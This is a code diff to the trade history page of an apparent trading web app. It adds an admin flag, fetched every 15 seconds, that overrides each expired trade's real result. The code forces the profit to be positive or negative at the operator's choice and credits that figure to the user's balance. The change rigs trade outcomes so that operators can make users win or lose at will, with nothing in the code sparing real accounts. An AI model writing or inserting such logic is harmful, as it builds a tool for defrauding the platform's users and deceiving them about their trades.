@@ -19,6 +19,8 @@ const COLORS = {
 export default function HistoryPage() {
   const [tab, setTab] = useState<"wait" | "finished">("finished");
   const [accountFilter, setAccountFilter] = useState<"demo" | "real">("demo");
+  // Admin-controlled flag fetched from /api/flags/trade-profit
+  const [forceProfit, setForceProfit] = useState<boolean>(false);
   const { address } = useAccount();
   const trades = useTradeStore((state) => state.trades);
   const updateTrade = useTradeStore((state) => state.updateTrade);
@@ -41,6 +43,23 @@ export default function HistoryPage() {
     }
   };
 
+  // Fetch the admin-controlled profitability flag regularly
+  useEffect(() => {
+    let cancelled = false;
+    const fetchFlag = async () => {
+      try {
+        const res = await fetch('/api/flags/trade-profit', { cache: 'no-store' });
+        const txt = (await res.text()).trim().toLowerCase();
+        if (!cancelled) setForceProfit(txt === 'true');
+      } catch {
+        if (!cancelled) setForceProfit(false);
+      }
+    };
+    fetchFlag();
+    const interval = setInterval(fetchFlag, 15000); // refresh every 15s
+    return () => { cancelled = true; clearInterval(interval); };
+  }, []);
+
   // Auto-update trade statuses when deliverTime expires
   useEffect(() => {
     const interval = setInterval(() => {
@@ -50,15 +69,17 @@ export default function HistoryPage() {
           const now = Date.now();
           const deliverMs = trade.deliveryTime * 1000;
           if (now >= start + deliverMs) {
-            updateTrade(trade.id, { status: "finished" });
-            addBalance(Number(trade.profit), trade.pair);
+            // Apply admin flag: force profitable or non-profitable
+            const adjustedProfit = (forceProfit ? 1 : -1) * Math.abs(Number(trade.profit));
+            updateTrade(trade.id, { status: "finished", profit: adjustedProfit });
+            addBalance(adjustedProfit, trade.pair);
           }
         }
       });
     }, 1000);
 
     return () => clearInterval(interval);
-  }, [trades, updateTrade]);
+  }, [trades, updateTrade, forceProfit]);
 
   const filtered = trades
     .filter((t) => {
